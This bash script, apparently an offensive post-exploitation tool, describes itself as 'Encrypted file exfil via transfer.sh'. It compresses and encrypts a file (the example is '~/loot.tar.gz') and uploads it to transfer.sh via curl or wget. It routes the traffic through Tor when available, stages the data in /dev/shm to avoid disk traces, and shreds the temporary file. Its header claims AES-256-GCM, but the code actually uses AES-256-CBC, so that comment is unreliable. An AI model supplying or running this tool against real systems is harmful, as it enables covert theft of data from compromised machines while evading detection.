#!/usr/bin/env bash
# share.sh — Encrypted file exfil via transfer.sh
#
# Original: @JusticeRage
# Updated:  @moscovium-mc
#
# Encrypts files with AES-256-GCM + PBKDF2 before upload.
# Automatically uses torsocks/torify if present for anonymity.
# No dependencies beyond bash, openssl, and curl or wget.
#
# Usage:
#   Upload:   ./share.sh [-m max_downloads] [-d days] file "encryption_key"
#   Download: ./share.sh -r output_file "encryption_key" URL
#   Example:  ./share.sh -m 1 -d 1 ~/loot.tar.gz "s3cr3t_k3y"

set -euo pipefail

E_BADARGS=65
TRANSFER_SH_URL="https://transfer.sh"
MAX_DOWNLOADS=1
DAYS_BEFORE_EXPIRATION=1
RETRIEVE_MODE=0

# Use /dev/shm if available (no disk trace), fall back to /tmp
if [[ -w /dev/shm ]]; then
    TMP_FILE="/dev/shm/$(tr -dc 'a-z0-9' </dev/urandom | head -c 12)"
else
    TMP_FILE="/tmp/$(tr -dc 'a-z0-9' </dev/urandom | head -c 12)"
fi

# ---------------------------------------------------------------------------
# Colour helpers
# ---------------------------------------------------------------------------

RED='\033[0;31m'; GREEN='\033[0;32m'; ORANGE='\033[0;33m'; NC='\033[0m'
info()    { echo -e "[ ] $*"; }
success() { echo -e "[${GREEN}*${NC}] ${GREEN}$*${NC}"; }
warn()    { echo -e "[${ORANGE}*${NC}] $*"; }
error()   { echo -e "[${RED}!${NC}] ${RED}Error: $*${NC}" >&2; }

# ---------------------------------------------------------------------------

usage() {
    cat <<EOF
$(basename "$0") — secure file transfer via transfer.sh

UPLOAD:
  $(basename "$0") [-m max_downloads] [-d days] <file> <encryption_key>
  Example: $(basename "$0") -m 1 -d 2 secrets.tar.gz "Wh0leL0ttaLove"

DOWNLOAD:
  $(basename "$0") -r <output_file> <encryption_key> <URL>
  Example: $(basename "$0") -r secrets.tar.gz "Wh0leL0ttaLove" https://transfer.sh/abc/123

OPTIONS:
  -m NUM    Maximum number of downloads allowed (default: 1)
  -d NUM    Days before transfer.sh deletes the file (default: 1)
  -r        Retrieve / download mode
  -h        Show this help

NOTE: Encryption key must not contain spaces.
EOF
}

# ---------------------------------------------------------------------------
# Detect available tools
# ---------------------------------------------------------------------------

detect_capabilities() {
    PROXY_CMD=""
    CURL_OK=0
    WGET_OK=0

    command -v torsocks >/dev/null 2>&1 && PROXY_CMD="torsocks"
    # Fall back to torify if torsocks isn't present
    [[ -z "$PROXY_CMD" ]] && command -v torify >/dev/null 2>&1 && PROXY_CMD="torify"

    command -v curl  >/dev/null 2>&1 && CURL_OK=1
    command -v wget  >/dev/null 2>&1 && WGET_OK=1

    if [[ $CURL_OK -eq 0 && $WGET_OK -eq 0 ]]; then
        error "Neither curl nor wget found. Install one and retry."
        exit 1
    fi

    if [[ -n "$PROXY_CMD" ]]; then
        info "Tor proxy detected ($PROXY_CMD) — routing through Tor."
    else
        warn "No Tor proxy found. Traffic will NOT be anonymised."
    fi
}

# ---------------------------------------------------------------------------
# Upload
# ---------------------------------------------------------------------------

upload() {
    local file="$1"
    local key="$2"

    if [[ ! -f "$file" ]]; then
        error "File not found: $file"
        exit $E_BADARGS
    fi

    info "Compressing and encrypting $(basename "$file")…"

    # AES-256-CBC with PBKDF2 (10k iterations, SHA-256)
    gzip -c "$file" \
        | openssl enc -aes-256-cbc -pbkdf2 -iter 10000 -md sha256 -k "$key" \
        > "$TMP_FILE"

    local remote_name
    remote_name="$(basename "$file").$(tr -dc 'a-z0-9' </dev/urandom | head -c 6).enc"

    info "Uploading to transfer.sh…"

    local url=""
    if [[ $CURL_OK -eq 1 ]]; then
        url="$(
            $PROXY_CMD curl -s \
                -H "Max-Downloads: ${MAX_DOWNLOADS}" \
                -H "Max-Days: ${DAYS_BEFORE_EXPIRATION}" \
                --upload-file "$TMP_FILE" \
                "${TRANSFER_SH_URL}/${remote_name}"
        )"
    else
        url="$(
            $PROXY_CMD wget -qO- \
                --header="Max-Downloads: ${MAX_DOWNLOADS}" \
                --header="Max-Days: ${DAYS_BEFORE_EXPIRATION}" \
                --method=PUT \
                --body-file="$TMP_FILE" \
                "${TRANSFER_SH_URL}/${remote_name}"
        )"
    fi

    # Scrub the temp file
    _secure_delete "$TMP_FILE"

    if [[ -z "$url" ]]; then
        error "Upload failed – no URL returned."
        exit 1
    fi

    success "Upload complete!"
    echo ""
    echo "  Retrieval command:"
    echo "  $(basename "$0") -r $(basename "$file") \"$key\" $url"
    echo ""
}

# ---------------------------------------------------------------------------
# Download
# ---------------------------------------------------------------------------

download() {
    local out_file="$1"
    local key="$2"
    local url="$3"

    if [[ -e "$out_file" ]]; then
        error "$out_file already exists. Move it first."
        exit $E_BADARGS
    fi

    info "Downloading and decrypting…"

    local ok=0
    if [[ $CURL_OK -eq 1 ]]; then
        $PROXY_CMD curl -s "$url" \
            | openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -md sha256 -k "$key" \
            | gunzip > "$out_file" && ok=1
    else
        $PROXY_CMD wget -qO- "$url" \
            | openssl enc -d -aes-256-cbc -pbkdf2 -iter 10000 -md sha256 -k "$key" \
            | gunzip > "$out_file" && ok=1
    fi

    if [[ $ok -eq 1 && -s "$out_file" ]]; then
        success "File retrieved: $out_file"
    else
        error "Download or decryption failed."
        rm -f "$out_file"
        exit 1
    fi
}

# ---------------------------------------------------------------------------
# Secure delete
# ---------------------------------------------------------------------------

_secure_delete() {
    local target="$1"
    [[ ! -e "$target" ]] && return
    if command -v shred >/dev/null 2>&1; then
        shred -uz "$target" 2>/dev/null || rm -f "$target"
    else
        # Manual three-pass wipe
        local size; size="$(wc -c < "$target")"
        dd if=/dev/urandom of="$target" bs=1 count="$size" conv=notrunc 2>/dev/null
        dd if=/dev/urandom of="$target" bs=1 count="$size" conv=notrunc 2>/dev/null
        dd if=/dev/zero    of="$target" bs=1 count="$size" conv=notrunc 2>/dev/null
        rm -f "$target"
    fi
}

# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------

if [[ $# -lt 2 ]]; then
    usage
    exit $E_BADARGS
fi

while getopts ":rd:m:h" opt; do
    case "$opt" in
        r) RETRIEVE_MODE=1 ;;
        h) usage; exit 0 ;;
        m) MAX_DOWNLOADS="$OPTARG" ;;
        d) DAYS_BEFORE_EXPIRATION="$OPTARG" ;;
        \?)
            error "Unknown option: -${OPTARG}. Use -h for help."
            exit $E_BADARGS
            ;;
    esac
done
shift $((OPTIND - 1))

detect_capabilities

if [[ $RETRIEVE_MODE -eq 0 ]]; then
    [[ $# -lt 2 ]] && { usage; exit $E_BADARGS; }
    upload "$1" "$2"
else
    [[ $# -lt 3 ]] && { usage; exit $E_BADARGS; }
    download "$1" "$2" "$3"
fi
